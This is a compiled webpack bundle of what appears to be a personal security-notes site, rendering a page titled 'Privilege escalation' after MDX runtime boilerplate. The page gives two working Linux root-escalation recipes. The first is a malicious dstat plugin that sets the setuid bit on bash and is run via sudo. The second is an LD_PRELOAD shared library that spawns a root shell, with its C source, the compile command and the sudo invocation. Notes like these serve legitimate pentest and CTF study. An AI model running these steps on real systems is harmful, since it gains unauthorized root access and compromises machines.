"use strict";(self.webpackChunk_2_h_3_ph_3rd_github_io=self.webpackChunk_2_h_3_ph_3rd_github_io||[]).push([[7878],{3905:(e,t,n)=>{n.d(t,{Zo:()=>p,kt:()=>h});var r=n(7294);function i(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function a(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function l(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?a(Object(n),!0).forEach((function(t){i(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):a(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,r,i=function(e,t){if(null==e)return{};var n,r,i={},a=Object.keys(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||(i[n]=e[n]);return i}(e,t);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);for(r=0;r<a.length;r++)n=a[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(i[n]=e[n])}return i}var o=r.createContext({}),c=function(e){var t=r.useContext(o),n=t;return e&&(n="function"==typeof e?e(t):l(l({},t),e)),n},p=function(e){var t=c(e.components);return r.createElement(o.Provider,{value:t},e.children)},u="mdxType",d={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},m=r.forwardRef((function(e,t){var n=e.components,i=e.mdxType,a=e.originalType,o=e.parentName,p=s(e,["components","mdxType","originalType","parentName"]),u=c(n),m=i,h=u["".concat(o,".").concat(m)]||u[m]||d[m]||a;return n?r.createElement(h,l(l({ref:t},p),{},{components:n})):r.createElement(h,l({ref:t},p))}));function h(e,t){var n=arguments,i=t&&t.mdxType;if("string"==typeof e||i){var a=n.length,l=new Array(a);l[0]=m;var s={};for(var o in t)hasOwnProperty.call(t,o)&&(s[o]=t[o]);s.originalType=e,s[u]="string"==typeof e?e:i,l[1]=s;for(var c=2;c<a;c++)l[c]=n[c];return r.createElement.apply(null,l)}return r.createElement.apply(null,n)}m.displayName="MDXCreateElement"},4269:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>o,contentTitle:()=>l,default:()=>d,frontMatter:()=>a,metadata:()=>s,toc:()=>c});var r=n(7462),i=(n(7294),n(3905));const a={id:"privilige-escalation",title:"\ud83d\udd12 Privilege escalation"},l="Privilege escalation",s={unversionedId:"security/privilege-escalation/privilige-escalation",id:"security/privilege-escalation/privilige-escalation",title:"\ud83d\udd12 Privilege escalation",description:"dstat",source:"@site/docs/security/03-privilege-escalation/index.md",sourceDirName:"security/03-privilege-escalation",slug:"/security/privilege-escalation/",permalink:"/docs/security/privilege-escalation/",draft:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/security/03-privilege-escalation/index.md",tags:[],version:"current",frontMatter:{id:"privilige-escalation",title:"\ud83d\udd12 Privilege escalation"},sidebar:"securitySidebar",previous:{title:"Databases",permalink:"/docs/security/enumeration/database-enumeration"},next:{title:"Binary exploitation",permalink:"/docs/security/binary/"}},o={},c=[{value:"dstat",id:"dstat",level:3},{value:"LD_PRELOAD trick",id:"ld_preload-trick",level:3}],p={toc:c},u="wrapper";function d(e){let{components:t,...a}=e;return(0,i.kt)(u,(0,r.Z)({},p,a,{components:t,mdxType:"MDXLayout"}),(0,i.kt)("h1",{id:"privilege-escalation"},"Privilege escalation"),(0,i.kt)("h3",{id:"dstat"},"dstat"),(0,i.kt)("p",null,"If dstat can be run as root it is possible to write a new plugin to make some actions like the root inside the system."),(0,i.kt)("p",null,"Using LinPeas the output should be something like this:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"permit nopass <user> as root cmd /usr/bin/dstat\n")),(0,i.kt)("p",{align:"center"},(0,i.kt)("img",{width:"70%",src:n(8772).Z})),(0,i.kt)("p",null,"New plugins can be written inside the folder ",(0,i.kt)("inlineCode",{parentName:"p"},"/usr/local/share/dstat")),(0,i.kt)("p",null,"The filename format should be ",(0,i.kt)("inlineCode",{parentName:"p"},"dstat_<plugin_name>.py")," like ",(0,i.kt)("inlineCode",{parentName:"p"},"dstat_hack.py")),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-sh"},"vi /usr/local/share/dstat/dstat_hack.py\n")),(0,i.kt)("p",null,"This could be the content of the file"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-py"},"import os\nos.system('chmod +s /usr/bin/bash')\n")),(0,i.kt)("p",null,"This code once executed activates the setuid bit of bash making it runnable as root."),(0,i.kt)("p",null,"Now, it is possible to run the custom plugin and become root."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre"},"sudo /usr/bin/dstat --hack\nbash -p\n")),(0,i.kt)("h3",{id:"ld_preload-trick"},"LD_PRELOAD trick"),(0,i.kt)("p",null,"You can use this trick if the user has access to a binary or a script with sudo privilege."),(0,i.kt)("p",null,"Also there must be no specific override of the LD_PRELOAD variable. You can check it by using the command ",(0,i.kt)("inlineCode",{parentName:"p"},"sudo -l"),"."),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-c",metastring:'title="shell.c"',title:'"shell.c"'},'void _init()\n{\n    unsetenv("LD_PRELOAD");\n    setgid(0);\n    execl("/bin/sh", "-sh", 0);\n}\n')),(0,i.kt)("p",null,"To compile use this command:"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-sh"},"gcc -shared -fPIC -nostartfiles -o shell.so shell.c\n")),(0,i.kt)("p",null,"Finally, run the file with privileges prepended with the new library"),(0,i.kt)("pre",null,(0,i.kt)("code",{parentName:"pre",className:"language-sh"},"sudo LD_PRELOAD=/tmp/shell.so <PATH>\n")))}d.isMDXComponent=!0},8772:(e,t,n)=>{n.d(t,{Z:()=>r});const r=n.p+"assets/images/dstat-2a502064d3b707ea7936862160911f7a.png"}}]);